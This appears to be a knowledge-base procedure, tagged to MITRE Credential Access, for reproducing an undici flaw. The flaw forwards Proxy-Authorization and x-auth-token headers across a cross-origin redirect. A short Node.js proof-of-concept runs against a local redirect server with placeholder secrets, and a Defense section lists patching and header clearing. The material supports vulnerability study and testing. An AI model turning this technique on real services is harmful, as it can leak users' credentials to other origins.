---
tags:
  - undici
  - http-request
  - header-leak
type: procedure
tools:
  - '[[tools/undici]]'
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Node.js
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Unsecured Credentials]]'
updated_at: '2025-12-14T17:29:09.541Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: d4a9a80d-c27f-4890-b0b9-687d61a4e5d6
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Unsecured Credentials]]'
---
# Execute-Undici-Request

## Summary

This procedure executes an HTTP GET request using the undici library in Node.js, including sensitive headers, to trigger a cross-origin redirect and demonstrate header forwarding.

## Description

The undici.request function is invoked with maxRedirections:1 to follow the redirect once. Sensitive headers (Proxy-Authorization and x-auth-token) are set, targeting http://127.0.0.1/ which redirects to the local a.com:2333. This exploits the library's redirect handler in lib/handler/redirect-handler.js, which only clears 'authorization' and 'cookie' headers.

## Requirements

1. Node.js installed with undici (npm install undici)
2. Local redirect server running (from Setup-Redirect-Server)
3. DNS mapping configured

## Defense

Defensive measures and detection strategies:

- Patch undici to latest version (post-v5.28.2 fix if applicable)
- Manually clear non-standard headers in custom redirect logic
- Log and inspect outgoing headers in proxy or client applications

## Objectives

1. Trigger automatic redirect with sensitive headers
2. Observe undici's default behavior for header preservation
3. Confirm vulnerability activation without errors

## Instructions

### Step 1: Create Node.js Script

**Context**: Write a script to perform the request with specified options.

**Command** (create script):
```bash
cat > undici-test.js << EOF
const { request } = require('undici');
request({
  method: 'GET',
  url: 'http://127.0.0.1/',
  maxRedirections: 1,
  origin: 'http://127.0.0.1/',
  headers: {
    'Proxy-Authorization': 'secret Proxy-Authorization',
    'x-auth-token': 'secret x-auth-token'
  }
}).then(({ statusCode, headers, body }) => {
  console.log('Status:', statusCode);
  console.log('Headers:', headers);
}).catch(console.error);
EOF
```

> Creates the test script. Expected output: File created.

### Step 2: Run the Request

**Context**: Execute the script to send the request.

**Command** (run Node.js):
```bash
node undici-test.js
```

> Triggers the request and redirect. Expected output: Status code from final response (e.g., 200 if listener responds), no immediate header leak visible here.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]]

### Techniques

- [[Unsecured Credentials]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/undici]]

## Tags

- undici
- http-request
- header-leak
